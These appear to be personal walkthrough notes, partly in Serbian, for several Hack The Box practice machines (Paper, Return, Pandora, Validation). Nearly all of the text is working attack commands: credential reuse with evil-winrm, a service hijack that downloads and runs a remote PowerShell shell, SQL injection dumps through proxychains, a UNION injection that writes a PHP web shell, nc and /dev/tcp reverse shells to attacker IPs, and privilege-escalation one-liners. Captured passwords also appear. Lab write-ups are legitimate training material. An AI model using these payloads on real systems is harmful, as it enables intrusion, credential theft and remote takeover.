# Machines


***************************************************** -Paper *****************************************************************
nmap
Response :   X-Backend-Server: office.paper
wpscan --url "http://office.paper" -v -e ap --plugins-detection aggressive
https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
?static=1
http://chat.office.paper/register/8qozr226AhkCHZdyY
recyclops --> recyclops list ../.ssh/  --> recyclops list ../hubot/  --> recyclops file ../hubot/.env
ssh dwight@IP --> 
python -m http.server --> downlaod to server linpeas.sh /tmp   OR  curl 10.10.14.38:8000/linpeas.sh -o linpeas.sh
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
./leanpeas.sh  --> https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version    Sudo version 1.8.29 
on victim server: curl 10.10.14.38:8000/50011.sh -o 50011.sh --> ./50011.sh --> su - hacked - password .. sudo su
***************************************************Return (yt-ready set exploit)**********************************************
nc -lvnp 389 and update the printer page 10.10.11.108/settings.php i dodamo u server adresu nasu!!! --> 1edFg43012!!
crackmapexec smb 10.10.11.108 -u svc-printer -p '1edFg43012!!'
crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!'    --> 5985 port winrm
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'  --> bingo!! user.txt
	checking for print nightmare
	$PrintSpooler = Get-Service -Name Spooler
	$PrintSpooler
	whoami /all   --> BUILTIG\Server Operators
	net user svc-printer  --> part of server operators!!!
	
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1  - shell.ps1 -  reverse shell EXAMPLE with ip add to the bottom!!! 
.EXAMPLE
PS > Invoke-PowerShellTcp -Reverse -IPAddress ourIP-Port 4444
 this is gonna save on our pc and deploy with python server help

https://cube0x0.github.io/Pocing-Beyond-DA/  --sc.exe
winrm -->	sc.exe config vss binPath="C:\Windows\System32\cmd.exe /c powershell/exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.58/nishang-tool.ps1')"
(rlwrap) nc -lvnp 9001
sc.exe stop VSS
sc.exe start VSS --> bingo admin!!!
*************************************************Pandora - 10.10.11.136 ************************************************
---> https://blog.peterjbrowning.com/2022/01/htb-writeup-pandora
run udp scan ports also -->  sudo nmap -sU -top-ports=20 pandora.htb --> open snmp
https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/common-snmp-community-strings.txt
snmpwalk to enumerate all the infos -> snmpwalk -v 1 -c public pandora.htb > snmpwalk-1.txt  -nacicemo u .txt kredencijale za ssh
flag is in another /home/directory we need to pivot to another user
netstat -a --> more domain
cat /etc/hosts  --> we need set up the tunnel (port forwarding) !!!--> nasa masina: ssh -D 9090 daniel@pandora.htb + set up proxy SOCKS5 supports dns resolution (localhost.locadomain) u browseru -> trying to get in browser http://localhost.localdomain/pandora_console/

page is vulnerable on - https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained/ 
we are gonna try to exploit with sql map and proxychains - tool which allows us to pivot tools info system without installing them 
set up proxychains on our machine  /etc/proxychains4.conf -> socks5 127.0.0.1 9090 daniel HotelBabylon23
proxychains sqlmap -- url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -T tpassword_history -dump

proxychains sqlmap --url="http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=''" -D pandora -T tsessions_php -dump 
 take one session from matt's and add into url see if works --> id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0;
 http://localhost.localdomain/pandora_console/index.php?session_id=%22g4e01qdgk36mfdh90hvcc54umq%22 -- url encoded!!
 RCE cve:
 https://shells.systems/pandorafms-v7-0ng-authenticated-remote-code-execution-cve-2019-20224/
 https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated/
 http://localhost.localdomain/pandora_console/include/chart_generator.php?session_id=' union SELECT 1,2,'id_usuario|s:5:"admin";' as data -- x 
 then comeback and reload page!! boom admin :)
 
 upload easy web php shell - https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985
http://localhost.localdomain/pandora_console/images/easy-simple-php-webshell.php
 idi na link - probaj id
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.186 1337 >/tmp/f   --- BINGO reverse shell!!!
 	python3 -c 'import pty;pty.spawn("/bin/bash");' --get more access in terminal
 
 priv escalation****
 find / -perm -4000 2>/dev/null
 	https://docs.oracle.com/cd/E19683-01/816-4883/6mb2joatb/index.html
 after investigation - Setuid permisions = pandora_backup = s matt-ovog accounta
 https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/ --ne radi!
 ovo sigurno radi:
 https://gtfobins.github.io/gtfobins/at/#sudo  --> echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
 python3 -c 'import pty;pty.spawn("/bin/bash");'
 cd /tmp --> echo "/bin/bash" > tar --> chmod 777 tar
 pandora_backup --> boom!!rooot
 
 root-b2b06638daf5c512ef503e07f11ab679
  
 *************************************************Validation************************************************
 tet in Burp - send requests through repeater,, notice that cookies are static (try wc -c = 32 charactera = it could be MD5)
 try sql injection
 Burp:
 username=shell&country=Brazil' union select "<?php SYSTEM($_REQUEST['cmd']) ?>" INTO OUTFILE '/var/www/html/shell.php' -- -  --> 
 copy the cookie from the burp and put in browser
 ip/shell.php  -->  ip/shell.php?cmd=id
 change request method in burp --> dodamo jos cmd=bash -c 'bash -i >& /dev/tcp/nasaIP/9001 0>&1' i encodujemo ga!!! bingo --> u config.php bi trebali da su credentials za DB!!! takodje i za root :)  su -  
 
 https://gist.github.com/GoldenOak/8d17defb2e68b05e3c25c93cdc0025c7
  
 
 
   
 
 





